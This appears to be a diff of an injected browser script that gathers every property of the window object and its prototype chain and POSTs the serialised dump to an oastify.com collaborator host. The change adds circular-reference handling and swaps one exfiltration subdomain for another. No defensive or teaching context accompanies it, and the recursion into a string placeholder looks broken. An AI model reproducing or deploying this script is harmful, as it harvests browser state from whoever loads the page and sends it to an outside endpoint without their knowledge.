@@ -116,20 +116,29 @@ sendRequest();
 // Function to get all properties and methods from the window object and its prototype chain
 function getWindowProperties() {
     let result = {};
+    let seen = new WeakSet();
 
     function getAllProperties(obj, result) {
+        if (seen.has(obj)) return; // Skip objects we've already seen
+        seen.add(obj);
+
         let properties = Object.getOwnPropertyNames(obj);
         for (let i = 0; i < properties.length; i++) {
             let property = properties[i];
-            if (!result.hasOwnProperty(property)) {
+            if (!(property in result)) {
                 try {
                     // Fetch the property value
                     let value = obj[property];
-                    // Exclude certain properties or types (optional)
-                    if (typeof value !== 'function') {
-                        result[property] = value;
+                    // Handle circular references
+                    if (typeof value === 'object' && value !== null) {
+                        if (seen.has(value)) {
+                            result[property] = '[Circular]';
+                        } else {
+                            result[property] = '[Object]';
+                            getAllProperties(value, result[property]);
+                        }
                     } else {
-                        result[property] = '[Function]';
+                        result[property] = typeof value === 'function' ? '[Function]' : value;
                     }
                 } catch (e) {
                     result[property] = '[Error]';
@@ -137,9 +146,9 @@ function getWindowProperties() {
             }
         }
 
-        // Recursively get properties from prototype chain
+        // Recursively get properties from the prototype chain
         let proto = Object.getPrototypeOf(obj);
-        if (proto) {
+        if (proto && proto !== Object.prototype) {
             getAllProperties(proto, result);
         }
     }
@@ -153,10 +162,13 @@ function sendProperties() {
     let properties = getWindowProperties();
 
     // Serialize properties to JSON
-    let propertiesJSON = JSON.stringify(properties);
+    let propertiesJSON = JSON.stringify(properties, (key, value) => {
+        // Optional: Customize how values are serialized
+        return value;
+    });
 
     // Send properties to a server (for example)
-    fetch('https://iyklc45l0j4m6neg8x2ejhvi49a0y5mu.oastify.com', {
+    fetch('https://ssov6ezvutyw0x8q27wodrpsyj4as1ip7.oastify.com', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -169,6 +181,7 @@ function sendProperties() {
 
 // Call the function to send the properties list
 sendProperties();
+
 
 
 </script>
